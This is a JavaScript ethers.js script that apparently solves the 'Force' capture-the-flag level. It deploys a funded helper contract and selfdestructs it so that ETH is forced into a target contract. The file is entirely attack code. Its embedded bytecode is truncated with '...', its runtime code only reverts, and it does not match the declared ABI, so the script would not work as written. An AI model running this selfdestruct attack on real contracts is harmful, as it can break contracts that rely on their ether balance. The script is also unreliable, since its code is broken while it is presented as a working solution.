import { ethers } from "ethers";

export default async function (providerUrl, ...args) {
  const forceAddress = args[0];       // Force contract address
  const attackerIndex = args[1];      // Index of signer who will deploy attacker contract

  const provider = new ethers.JsonRpcProvider(providerUrl);
  const signer = await provider.getSigner(attackerIndex);

  // 1. Deploy ForceSender contract with 0.01 ETH
  const ForceSenderFactory = new ethers.ContractFactory(
    [
      "constructor() payable",
      "function destroy(address payable _target) public"
    ],
    "0x608060405234801561001057600080fd5b506040516101003803806101008339818101604052602081101561003357600080fd5b505160005560d6806100456000396000f3fe6080604052600080fdfea2646970667358221220...",
    signer
  );

  const forceSender = await ForceSenderFactory.deploy({ value: ethers.parseEther("0.01") });
  await forceSender.waitForDeployment();
  console.log("ForceSender deployed at:", forceSender.target);

  // 2. Check Force contract balance before attack
  let balance = await provider.getBalance(forceAddress);
  console.log("Force contract balance before attack:", ethers.formatEther(balance), "ETH");

  // 3. Trigger selfdestruct to send ETH to Force contract
  const tx = await forceSender.destroy(forceAddress);
  await tx.wait();

  // 4. Check Force contract balance after attack
  balance = await provider.getBalance(forceAddress);
  console.log("Force contract balance after attack:", ethers.formatEther(balance), "ETH");
}

